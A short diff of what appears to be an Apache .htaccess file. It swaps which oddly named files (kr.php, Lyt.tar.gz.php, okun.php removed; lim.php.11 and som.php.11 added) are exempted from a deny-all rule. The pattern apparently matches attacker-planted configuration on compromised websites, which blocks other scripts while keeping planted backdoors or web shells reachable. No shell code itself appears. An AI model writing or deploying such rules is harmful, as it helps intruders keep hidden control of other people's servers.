@@ -3,19 +3,10 @@ Options -Indexes
     Order Deny,Allow
     Deny from all
 </FilesMatch>
-<Files kr.php>
+<Files lim.php.11>
 Allow from all
 </Files>
-<Files Lyt.zip.gz.txt.php>
-Allow from all
-</Files>
-<Files Lyt.tar.gz.php>
-Allow from all
-</Files>
-<Files class-mate.php>
-Allow from all
-</Files>
-<Files okun.php>
+<Files som.php.11>
 Allow from all
 </Files>
 <FilesMatch \.(lol)$>
